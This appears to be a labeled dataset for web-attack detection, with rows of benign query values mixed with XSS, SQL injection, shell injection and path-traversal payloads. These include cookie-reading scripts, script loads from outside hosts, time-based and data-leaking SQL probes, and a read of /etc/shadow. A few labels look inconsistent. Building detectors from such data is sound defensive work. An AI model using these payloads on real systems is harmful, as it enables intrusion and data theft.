index,payload,is_malicious,injection_type
3072,"<script> function foo(elem, doc, text) { elem.onclick = function (e) { e.__defineGetter__(text[0], function () { return true }) alert(Safe.get()); }; var event = doc.createEvent(text[1]); event.initEvent(text[2], true, true); elem.dispatchEvent(event); } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #",1.0,XSS
3073,g66uin2,0.0,LEGAL
3074,18056,0.0,LEGAL
3075,47260,0.0,LEGAL
3076,springtime,0.0,LEGAL
3077,beholder,0.0,LEGAL
3078,hamburgers,0.0,LEGAL
3079,Calle+Da+Unidade%2C+184+7E,0.0,LEGAL
3080,thieu,0.0,LEGAL
3081,query,0.0,LEGAL
3082,http%3A%2F%2Fwww.break.com%2Findex2.html,0.0,LEGAL
3083,'><img src=X onerror=alert(1)>,1.0,XSS
3084,pentecostal,0.0,LEGAL
3085,"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1.0,XSS
3086,&utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+zdnet%2Fsecurity+%28ZDNet+Zero+Day%29&utm_content=Google+Reader,1.0,XSS
3087,ops,0.0,LEGAL
3088,"<video><source o?UTF-8?Q?n?error=""confirm(1)"">",1.0,XSS
3089,ayles,0.0,LEGAL
3090,observing,0.0,LEGAL
3091,corrado,0.0,LEGAL
3092,38036492N,0.0,LEGAL
3093,outstripping,0.0,LEGAL
3094,Virgilio+145+2E,0.0,LEGAL
3095,"'><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",1.0,XSS
3096,contently,0.0,LEGAL
3097,nonexistant306278712,0.0,LEGAL
3098,with(document.__parent__)alert(1),1.0,XSS
3099,Russ,0.0,LEGAL
3100,Joceline,0.0,LEGAL
3101,borkan%40discon.gw,0.0,LEGAL
3102,Hip%F3lito,0.0,LEGAL
3103,captions,0.0,LEGAL
3104,dug,0.0,LEGAL
3105,almsman,0.0,LEGAL
3106,nonexistant8045831,0.0,LEGAL
3107,' or''=',1.0,SQL
3108,&#X03c,1.0,XSS
3109,16909,0.0,LEGAL
3110,careful,0.0,LEGAL
3111,7956922980330683,0.0,LEGAL
3112,row,0.0,LEGAL
3113,Adan,0.0,LEGAL
3114,3709256796210266,0.0,LEGAL
3115,"javascr%0d%0aipt%3Aalert.call(this,%20document.domain)",1.0,XSS
3116,hating,0.0,LEGAL
3117,6av63l,0.0,LEGAL
3118,complimenter,0.0,LEGAL
3119,adjuring,0.0,LEGAL
3120,swimmers,0.0,LEGAL
3121,earn,0.0,LEGAL
3122,som0,0.0,LEGAL
3123,vol.,0.0,LEGAL
3124,Puebla+de+Cazalla%2C+La,0.0,LEGAL
3125,a%2Bulagar,0.0,LEGAL
3126,10392,0.0,LEGAL
3127,indirection,0.0,LEGAL
3128,jwahar,0.0,LEGAL
3129,Calle+Cubas+110+,0.0,LEGAL
3130,Shamyra,0.0,LEGAL
3131,tobiah8,0.0,LEGAL
3132,demarcate,0.0,LEGAL
3133,/dev/null; touch /tmp/blns.fail ; echo,1.0,SHELL
3134,leroy-beaulieu.rizzo7%40softwaresaas.cl,0.0,LEGAL
3135,husking,0.0,LEGAL
3136,Padulles+Veredas,0.0,LEGAL
3137,Adler,0.0,LEGAL
3138,Chi-Vien,0.0,LEGAL
3139,Sistiana,0.0,LEGAL
3140,1222164542017972,0.0,LEGAL
3141,22268,0.0,LEGAL
3142,vestiges,0.0,LEGAL
3143,Arzu,0.0,LEGAL
3144,materialize,0.0,LEGAL
3145,molten,0.0,LEGAL
3146,cer97708or7,0.0,LEGAL
3147,perpetration,0.0,LEGAL
3148,"<img src\x09=x onerror=""javascript:alert(1)"">",1.0,XSS
3149,disp833ar,0.0,LEGAL
3150,implied,0.0,LEGAL
3151,intransitively,0.0,LEGAL
3152,kedrova%40pablobracamonte.hn,0.0,LEGAL
3153,16727733V,0.0,LEGAL
3154,fife,0.0,LEGAL
3155,Kewaunee,0.0,LEGAL
3156,Leninism,0.0,LEGAL
3157,Fuente+el+Sa%FAz,0.0,LEGAL
3158,82839528Z,0.0,LEGAL
3159,radices,0.0,LEGAL
3160,7144,0.0,LEGAL
3161,9766800722499068,0.0,LEGAL
3162,Kishor,0.0,LEGAL
3163,backward,0.0,LEGAL
3164,notebook,0.0,LEGAL
3165,pas,0.0,LEGAL
3166,bootstrapping,0.0,LEGAL
3167,Boucher,0.0,LEGAL
3168,autocrat,0.0,LEGAL
3169,advisedly,0.0,LEGAL
3170,supra,0.0,LEGAL
3171,challenged,0.0,LEGAL
3172,howald,0.0,LEGAL
3173,1423739556079004,0.0,LEGAL
3174,Valkyrie,0.0,LEGAL
3175,alpargater%EDa,0.0,LEGAL
3176,50546,0.0,LEGAL
3177,Mariejeanne,0.0,LEGAL
3178,shinder,0.0,LEGAL
3179,-941+or+1,0.0,LEGAL
3180,crimsoning,0.0,LEGAL
3181,conceptualizes,0.0,LEGAL
3182,allocations,0.0,LEGAL
3183,Rec,0.0,LEGAL
3184,Calle+Valencia%2C+199%2C+9%3FB,0.0,LEGAL
3185,workstation,0.0,LEGAL
3186,/../../../../../../../../../../etc/shadow,1.0,SHELL
3187,Esbri,0.0,LEGAL
3188,licensing,0.0,LEGAL
3189,http://cirt.net/rfiinc.txt,0.0,LEGAL
3190,barrack,0.0,LEGAL
3191,"""><link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d",1.0,XSS
3192,stews,0.0,LEGAL
3193,8470,0.0,LEGAL
3194,tease,0.0,LEGAL
3195,Daroca,0.0,LEGAL
3196,1331990456325,0.0,LEGAL
3197,desacertadamente,0.0,LEGAL
3198,leap,0.0,LEGAL
3199,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",1.0,SQL
3200,saiah.bauer%40intapisur.mc,0.0,LEGAL
3201,89208475P,0.0,LEGAL
3202,7539210731606782,0.0,LEGAL
3203,Ranea,0.0,LEGAL
3204,35,0.0,LEGAL
3205,cALCInABLE,0.0,LEGAL
3206,1915vol+3,0.0,LEGAL
3207,oblak,0.0,LEGAL
3208,slumped,0.0,LEGAL
3209,7335,0.0,LEGAL
3210,1652,0.0,LEGAL
3211,1915san0078.tif,0.0,LEGAL
3212,Gilead,0.0,LEGAL
3213,R%E1banos,0.0,LEGAL
3214,Calvinize,0.0,LEGAL
3215,Nazism,0.0,LEGAL
3216,residential,0.0,LEGAL
3217,Guadahortuna,0.0,LEGAL
3218,5998,0.0,LEGAL
3219,Natalio,0.0,LEGAL
3220,traversals,0.0,LEGAL
3221,&#60;LAYER SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html&#34;&#62;&#60;&#47;LAYER&#62;,1.0,XSS
3222,baenero,0.0,LEGAL
3223,c:\users\administrator\documents,0.0,LEGAL
3224,42169,0.0,LEGAL
3225,271,0.0,LEGAL
3226,Fairmont,0.0,LEGAL
3227,instantiates,0.0,LEGAL
3228,nu%F1o,0.0,LEGAL
3229,disappoint,0.0,LEGAL
3230,pox,0.0,LEGAL
3231,elevate,0.0,LEGAL
3232,bog,0.0,LEGAL
3233,Jannelle,0.0,LEGAL
3234,"<?xml version=""1.0""?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>",1.0,XSS
3235,62955100Y,0.0,LEGAL
3236,alternatives,0.0,LEGAL
3237,pleas,0.0,LEGAL
3238,Leeds,0.0,LEGAL
3239,warmly,0.0,LEGAL
3240,0992218178104844,0.0,LEGAL
3241,basked,0.0,LEGAL
3242,leathern,0.0,LEGAL
3243,procurer,0.0,LEGAL
3244,pelican,0.0,LEGAL
3245,\x0adel\x09q64928545\x09#,0.0,LEGAL
3246,tracing,0.0,LEGAL
3247,animateness,0.0,LEGAL
3248,6505277758430555,0.0,LEGAL
3249,Seidel,0.0,LEGAL
3250,rutulis,0.0,LEGAL
3251,Plaza+Toledo+17%2C+12%3FB,0.0,LEGAL
3252,cotizada,0.0,LEGAL
3253,Sagaceta+Farell,0.0,LEGAL
3254,bevel,0.0,LEGAL
3255,motherly,0.0,LEGAL
3256,argonauts,0.0,LEGAL
3257,biennial,0.0,LEGAL
3258,wynnie,0.0,LEGAL
3259,15756299B,0.0,LEGAL
3260,depreciate,0.0,LEGAL
3261,pestanyes,0.0,LEGAL
3262,erode,0.0,LEGAL
3263,"""><script/src=data:,alert(1)-"">",1.0,XSS
3264,Almeria+S%2FN+,0.0,LEGAL
3265,5096181528553069,0.0,LEGAL
3266,3390284092037739,0.0,LEGAL
3267,dynamites,0.0,LEGAL
3268,doggedness,0.0,LEGAL
3269,ExTrAnJ%EDA,0.0,LEGAL
3270,Sharpe,0.0,LEGAL
3271,apartadero,0.0,LEGAL
3272,squeaky,0.0,LEGAL
3273,&search_string=%22%3E%3Cscript/xss%3Ealert%28/XSSPOSED/%29%3C/script/xss%3E,1.0,XSS
3274,Calle+Can+Verdera+59+,0.0,LEGAL
3275,herrier%40matchball.com.pf,0.0,LEGAL
3276,fetchingly,0.0,LEGAL
3277,Tomlinson,0.0,LEGAL
3278,Cortes+de+Arag%F3n,0.0,LEGAL
3279,<%0bscript>alert(1);</script>,1.0,XSS
3280,vacating,0.0,LEGAL
3281,Villalpando,0.0,LEGAL
3282,1331749542,0.0,LEGAL
3283,<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,1.0,XSS
3284,Sagarra+147+,0.0,LEGAL
3285,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",1.0,XSS
3286,ducts,0.0,LEGAL
3287,26329,0.0,LEGAL
3288,"-10331839.8982,4696291.3562,-10175296.8643,4852834.3901",0.0,LEGAL
3289,seethes,0.0,LEGAL
3290,Huy,0.0,LEGAL
3291,http%3A%2F%2Fblog.taragana.com%2Findex.php%2Farchive%2Ftop-10-websites-for-free-ebooks%2F,0.0,LEGAL
3292,Haley,0.0,LEGAL
3293,heeralal0,0.0,LEGAL
3294,rm\x09q77267797\x09#,0.0,LEGAL
3295,&#x0003e;,1.0,XSS
3296,desultory,0.0,LEGAL
3297,indebted,0.0,LEGAL
3298,"'><applet code=""javascript:confirm(1);"">",1.0,XSS
3299,Flossie,0.0,LEGAL
3300,62381470L,0.0,LEGAL
3301,\\00,0.0,LEGAL
3302,http%3A%2F%2Fmashable.com%2F2009%2F11%2F14%2Fgoogle-wave-use-cases%2F,0.0,LEGAL
3303,redundant,0.0,LEGAL
3304,foresters,0.0,LEGAL
3305,"""'""><s/000 ""'""><s/000",1.0,XSS
3306,1331994298231,0.0,LEGAL
3307,planetesimal,0.0,LEGAL
3308,criticisms,0.0,LEGAL
3309,Ribamont%E1n+al+Mar,0.0,LEGAL
3310,larkin,0.0,LEGAL
3311,0058041048086449,0.0,LEGAL
3312,17215340443837617451,0.0,LEGAL
3313,48395550P,0.0,LEGAL
3314,TrIncha-32r1,0.0,LEGAL
3315,Nixon,0.0,LEGAL
3316,Miltonist,0.0,LEGAL
3317,keeps,0.0,LEGAL
3318,Woody,0.0,LEGAL
3319,50535908D,0.0,LEGAL
3320,"""<IMG%20SRC=""""javascript:alert('WXSS')""""""",1.0,XSS
3321,Dalmau,0.0,LEGAL
3322,evolutes,0.0,LEGAL
3323,0.19282000+1258594944,0.0,LEGAL
3324,Lareo+Robles,0.0,LEGAL
3325,foru,0.0,LEGAL
3326,Paterna+del+Campo,0.0,LEGAL
3327,sandness,0.0,LEGAL
3328,Kajar,0.0,LEGAL
3329,Shiites,0.0,LEGAL
3330,atomics,0.0,LEGAL
3331,Fwpas,0.0,LEGAL
3332,headlined,0.0,LEGAL
3333,sturdiness,0.0,LEGAL
3334,.war,0.0,LEGAL
3335,cash4%40hotelestopsecret.cr,0.0,LEGAL
3336,nava,0.0,LEGAL
3337,affirm,0.0,LEGAL
3338,unwholesome,0.0,LEGAL
3339,anteaters,0.0,LEGAL
3340,mead,0.0,LEGAL
3341,Orfila+Ochotorrena,0.0,LEGAL
3342,grounding,0.0,LEGAL
3343,recorders,0.0,LEGAL
3344,bitternut,0.0,LEGAL
3345,insulted,0.0,LEGAL
3346,deteriorated,0.0,LEGAL
3347,breckner%40videoerotic.rw,0.0,LEGAL
3348,Manda,0.0,LEGAL
3349,"<a href=""javascript\\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1.0,XSS
3350,kerry,0.0,LEGAL
3351,C%2F+Criado%2C+21%2C+,0.0,LEGAL
3352,cavern,0.0,LEGAL
3353,armadillos,0.0,LEGAL
3354,22424515K,0.0,LEGAL
3355,DENOtAtIVO,0.0,LEGAL
3356,metallic,0.0,LEGAL
3357,intercommunicated,0.0,LEGAL
3358,<SCRIPT SRC=http://xss.cx/xss.js?<B>,1.0,XSS
3359,9A7bl1,0.0,LEGAL
3360,protector,0.0,LEGAL
3361,unlabelled,0.0,LEGAL
3362,"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",1.0,XSS
3363,29967631B,0.0,LEGAL
3364,{{0[a='constructor'][a]('alert(1)')()}},1.0,XSS
3365,usuaris,0.0,LEGAL
3366,Hormilleja,0.0,LEGAL
3367,pix,0.0,LEGAL
3368,Lorletha,0.0,LEGAL
3369,hp_openview_nnm_multiple_cmd_exec.nasl-1331904221|id,0.0,LEGAL
3370,a' or 'dfth'='dfth'--,1.0,SQL
3371,creamed,0.0,LEGAL
3372,or 1=1--,1.0,SQL
3373,"""<IFRAME SRC=""""javascript:alert('XSS');""""></IFRAME>""",1.0,XSS
3374,Porquet+Camarillo,0.0,LEGAL
3375,scalloped,0.0,LEGAL
3376,Edesio,0.0,LEGAL
3377,Interior+Parque+De+Nazaret+140%2C+,0.0,LEGAL
3378,Evy,0.0,LEGAL
3379,<<scr\0ipt/src=http://xss.com/xss.js></script,1.0,XSS
3380,40540,0.0,LEGAL
3381,Santiago+de+la+Puebla,0.0,LEGAL
3382,Calle+Robert+Gerhard%2C+S%2FN+6C,0.0,LEGAL
3383,http%3A%2F%2Fwww.mangafox.com%2Fmanga%2Ffreezing%2Fv02%2Fc009%2F4.html,0.0,LEGAL
3384,welsh.rivas%40sexplorador.tr,0.0,LEGAL
3385,Corredera+Alta+De+San+Pablo%2C+110%2C+,0.0,LEGAL
3386,Calveras+Algu%E9,0.0,LEGAL
3387,employees,0.0,LEGAL
3388,blooded,0.0,LEGAL
3389,deigns,0.0,LEGAL
3390,2592750778275929,0.0,LEGAL
3391,roughed,0.0,LEGAL
3392,cUrAtelA,0.0,LEGAL
3393,ext_manifest,0.0,LEGAL
3394,Cassandra,0.0,LEGAL
3395,Pazos+De+la+Mora,0.0,LEGAL
3396,esp%E1cica,0.0,LEGAL
3397,housework,0.0,LEGAL
3398,2373,0.0,LEGAL
3399,Percy,0.0,LEGAL
3400,certain,0.0,LEGAL
3401,Arrancacepas,0.0,LEGAL
3402,entrusted,0.0,LEGAL
3403,Valma,0.0,LEGAL
3404,joule,0.0,LEGAL
3405,' and+true=false--+,1.0,SQL
3406,caving,0.0,LEGAL
3407,lareine2,0.0,LEGAL
3408,settlement,0.0,LEGAL
3409,barriers,0.0,LEGAL
3410,C%2F+Albaida%2C+165%2C+2-A,0.0,LEGAL
3411,bereaved,0.0,LEGAL
3412,21387,0.0,LEGAL
3413,Clar%E0+Degomis,0.0,LEGAL
3414,instrumentalists,0.0,LEGAL
3415,Villanueva+del+Duque,0.0,LEGAL
3416,houses,0.0,LEGAL
3417,1257048686766,0.0,LEGAL
3418,Islamic,0.0,LEGAL
3419,vanes,0.0,LEGAL
3420,intently,0.0,LEGAL
3421,Fri%20Nov%2013%202009%2020:41:39%20GMT-0500%20(Eastern%20Standard%20Time),0.0,LEGAL
3422,anodized,0.0,LEGAL
3423,belligerently,0.0,LEGAL
3424,Usrouter,0.0,LEGAL
3425,Meredithe,0.0,LEGAL
3426,patr%EDsTica,0.0,LEGAL
3427,Bohemia,0.0,LEGAL
3428,1331749536,0.0,LEGAL
3429,%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,1.0,XSS
3430,10661,0.0,LEGAL
3431,verani%40viajesdacapalla.gq,0.0,LEGAL
3432,6144372823408043,0.0,LEGAL
3433,3621942696943868,0.0,LEGAL
3434,molar,0.0,LEGAL
3435,Gracie,0.0,LEGAL
3436,astonish,0.0,LEGAL
3437,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",1.0,XSS
3438,exquisitely,0.0,LEGAL
3439,1417058038,0.0,LEGAL
3440,valley,0.0,LEGAL
3441,abrogates,0.0,LEGAL
3442,Zo%E9,0.0,LEGAL
3443,"""><LAYER SRC=""javascript:alert(1);""></LAYER>",1.0,XSS
3444,Robustiana,0.0,LEGAL
3445,Loyola,0.0,LEGAL
3446,lymph,0.0,LEGAL
3447,hooted,0.0,LEGAL
3448,5718355774988214,0.0,LEGAL
3449,1332009306@nessus\x0d\x0aasteridex_in_code_injection.nasl,0.0,LEGAL
3450,galled,0.0,LEGAL
3451,60380887E,0.0,LEGAL
3452,unblocked,0.0,LEGAL
3453,boos92,0.0,LEGAL
3454,proofs,0.0,LEGAL
3455,trigger,0.0,LEGAL
3456,Cartago+117%2C+12%3FB,0.0,LEGAL
3457,stimulant,0.0,LEGAL
3458,Arluene,0.0,LEGAL
3459,financial,0.0,LEGAL
3460,beetles,0.0,LEGAL
3461,48277,0.0,LEGAL
3462,boatsmen,0.0,LEGAL
3463,leans,0.0,LEGAL
3464,ranger,0.0,LEGAL
3465,http%3A%2F%2Fthemidnightmadness.blogspot.com%2F2009%2F11%2Fjanet-jackson-make-me-dj-dan-remixes.html,0.0,LEGAL
3466,nursing,0.0,LEGAL
3467,jARAn6rO,0.0,LEGAL
3468,redisplays,0.0,LEGAL
3469,constraint,0.0,LEGAL
3470,premeditated,0.0,LEGAL
3471,airship,0.0,LEGAL
3472,C%2F+Duque+De+Medinaceli%2C+55%2C+3%3FF,0.0,LEGAL
3473,Carley,0.0,LEGAL
3474,feuds,0.0,LEGAL
3475,40237,0.0,LEGAL
3476,79540644C,0.0,LEGAL
3477,ls,0.0,LEGAL
3478,depicting,0.0,LEGAL
3479,retranslated,0.0,LEGAL
3480,octave,0.0,LEGAL
3481,%26ymv%3D0%26.rand%3D1530589618,0.0,LEGAL
3482,8888'+AND+'1'+LIKE+'1 -->,1.0,SQL
3483,Plaza+Asamblea+De+Madrid%2C+107%2C+,0.0,LEGAL
3484,"&lt;IMG SRC=""mocha:[code]""&gt;",1.0,XSS
3485,knockers,0.0,LEGAL
3486,Arrechea+Bellveh%ED,0.0,LEGAL
3487,rm\x09q75579332,0.0,LEGAL
3488,xie,0.0,LEGAL
3489,Agnola,0.0,LEGAL
3490,20464046A,0.0,LEGAL
3491,wealth,0.0,LEGAL
3492,"<x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)""><x:timer value=""1""/></x:template>",1.0,XSS
3493,turmoils,0.0,LEGAL
3494,shuffling,0.0,LEGAL
3495,reappears,0.0,LEGAL
3496,encrypt,0.0,LEGAL
3497,Patience,0.0,LEGAL
3498,alfred,0.0,LEGAL
3499,Svend,0.0,LEGAL
3500,Durali,0.0,LEGAL
3501,uploader,0.0,LEGAL
3502,juornneau%40buscadordevideos.cr,0.0,LEGAL
3503,"1+and+100>(ASCII(Substring(user(),1,1)))",1.0,SQL
3504,Salmeron+Quintal,0.0,LEGAL
3505,tod6,0.0,LEGAL
3506,perceptually,0.0,LEGAL
3507,die,0.0,LEGAL
3508,q88991179,0.0,LEGAL
3509,' or userid like '%,1.0,SQL
3510,&q=%22%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E,1.0,XSS
3511,more,0.0,LEGAL
3512,San+Sebastian%2C+181+,0.0,LEGAL
3513,brandywine,0.0,LEGAL
3514,char,0.0,LEGAL
3515,marmalade,0.0,LEGAL
3516,Sisely,0.0,LEGAL
3517,still,0.0,LEGAL
3518,1331749406,0.0,LEGAL
3519,12578,0.0,LEGAL
3520,Wan,0.0,LEGAL
3521,onom%E1stico,0.0,LEGAL
3522,Balkans,0.0,LEGAL
3523,C%2F+Font+Flavia%2C+14%2C+6C,0.0,LEGAL
3524,5408940503153342,0.0,LEGAL
3525,oury_boskovic8%40faders.com.tv,0.0,LEGAL
3526,Alforja,0.0,LEGAL
3527,1)) or pg_sleep(__TIME__)--,1.0,SQL
3528,09882221H,0.0,LEGAL
3529,"'><SPAN DATASRC=""#X"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1.0,XSS
3530,terror,0.0,LEGAL
3531,nasty,0.0,LEGAL
3532,Massan%E9s+Musella,0.0,LEGAL
3533,pooch,0.0,LEGAL
3534,Regine,0.0,LEGAL
3535,writ,0.0,LEGAL
3536,perero,0.0,LEGAL
3537,PROFRAME,0.0,LEGAL
3538,concealers,0.0,LEGAL
3539,seashore,0.0,LEGAL
3540,tosca,0.0,LEGAL
3541,kersten%40thw-adm.vi,0.0,LEGAL
3542,repentance,0.0,LEGAL
3543,cis60,0.0,LEGAL
3544,password,0.0,LEGAL
3545,Monzon+Pinart,0.0,LEGAL
3546,steamboat,0.0,LEGAL
3547,"&name=%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29%3C/SCRIPT%3E&size=XSS-by-GuidoZ",1.0,XSS
3548,Italianization,0.0,LEGAL
3549,C%2F+Murcia+34+,0.0,LEGAL
3550,"""><video poster=prompt(1)//></video>",1.0,XSS
3551,Joseph,0.0,LEGAL
3552,\x0arm q81267386 #,0.0,LEGAL
3553,))))) waitfor delay '0:0:20' --,1.0,SQL
3554,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>",1.0,XSS
3555,t6r3u6ada,0.0,LEGAL
3556,C%2F+Parque+Municipal+Juan+Machado%2C+81+,0.0,LEGAL
3557,Susannah,0.0,LEGAL
3558,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",1.0,SQL
3559,ignored,0.0,LEGAL
3560,ceriel0,0.0,LEGAL
3561,' union select,1.0,SQL
3562,Sen%E9s+de+Alcubierre,0.0,LEGAL
3563,"<INPUT TYPE=""IMAGE"" SRC=""javascript:confirm(document.location);"">",1.0,XSS
3564,media,0.0,LEGAL
3565,http%3A%2F%2Fwww.overstock.com%2FElectronics%2FBookeen-Cybook-Opus-e-Reader,0.0,LEGAL
3566,unawareness,0.0,LEGAL
3567,"<script src=""#"">{alert(1)}</script>;1",1.0,XSS
3568,casualties,0.0,LEGAL
3569,objective,0.0,LEGAL
3570,compilers,0.0,LEGAL
3571,kernan%40raullazaro.np,0.0,LEGAL
3572,McDowell,0.0,LEGAL
3573,hotels,0.0,LEGAL
3574,/fckeditor_currentfolder_file_upload-1331919015.php.,0.0,LEGAL
3575,C%E9sar,0.0,LEGAL
3576,Heiser,0.0,LEGAL
3577,janeva,0.0,LEGAL
3578,solicit,0.0,LEGAL
3579,devastate,0.0,LEGAL
3580,Travesia+Magdalena%2C+53+4%3FG,0.0,LEGAL
3581,39513,0.0,LEGAL
3582,"'><A HREF=""javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'"">X</A>",1.0,XSS
3583,Pl.+Maria+Santisima+De+La+Concepcion+131%2C+10-B,0.0,LEGAL
3584,3591958882412356,0.0,LEGAL
3585,Etorbidea+Askatasuna+170%2C+8%3FA,0.0,LEGAL
3586,http%3A%2F%2Fearplugz.blogspot.com%2F2009%2F10%2Ftop-20-albums-released-in-2009-so-far.html,0.0,LEGAL
3587,Glennie,0.0,LEGAL
3588,chirped,0.0,LEGAL
3589,Roales,0.0,LEGAL
3590,cosA%24Ca,0.0,LEGAL
3591,barricades,0.0,LEGAL
3592,arg.ande%F1a,0.0,LEGAL
3593,23531966E,0.0,LEGAL
3594,C%2F+Prado+De+La+Lana+101+12B,0.0,LEGAL
3595,increases,0.0,LEGAL
3596,grading,0.0,LEGAL
3597,peeling,0.0,LEGAL
3598,bequeathal,0.0,LEGAL
3599,//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////,1.0,XSS
3600,"‘;alert(String.fromCharCode(75,67,70));’",1.0,XSS
3601,apartment+buildings,0.0,LEGAL
3602,flushes,0.0,LEGAL
3603,41407341G,0.0,LEGAL
3604,giggles,0.0,LEGAL
3605,silken,0.0,LEGAL
3606,flirts,0.0,LEGAL
3607,fawn,0.0,LEGAL
3608,..%2F..%2F..%2Fbin/ls%20-al|',1.0,SHELL
3609,dualism,0.0,LEGAL
3610,ext_gz,0.0,LEGAL
3611,milder,0.0,LEGAL
3612,Layton,0.0,LEGAL
3613,nonexistant2127513044,0.0,LEGAL
3614,denotations,0.0,LEGAL
3615,Via+Universitas+66%2C+5-F,0.0,LEGAL
3616,sept,0.0,LEGAL
3617,&action=search&firstRequest=1&query=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&x=30&y=17&searchindex=gsa,1.0,XSS
3618,dependency,0.0,LEGAL
3619,9627,0.0,LEGAL
3620,chloroform,0.0,LEGAL
3621,michels,0.0,LEGAL
3622,"<img\\x32src=x onerror=""javascript:alert(1)"">",1.0,XSS
3623,incriminate,0.0,LEGAL
3624,insignificant,0.0,LEGAL
3625,Grumman,0.0,LEGAL
3626,lords,0.0,LEGAL
3627,Jackman,0.0,LEGAL
3628,whining,0.0,LEGAL
3629,"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1.0,XSS
3630,Rhode,0.0,LEGAL
3631,Herta,0.0,LEGAL
3632,69549902H,0.0,LEGAL
3633,coaxer,0.0,LEGAL
3634,afflicted,0.0,LEGAL
3635,Villar+del+Arzobispo,0.0,LEGAL
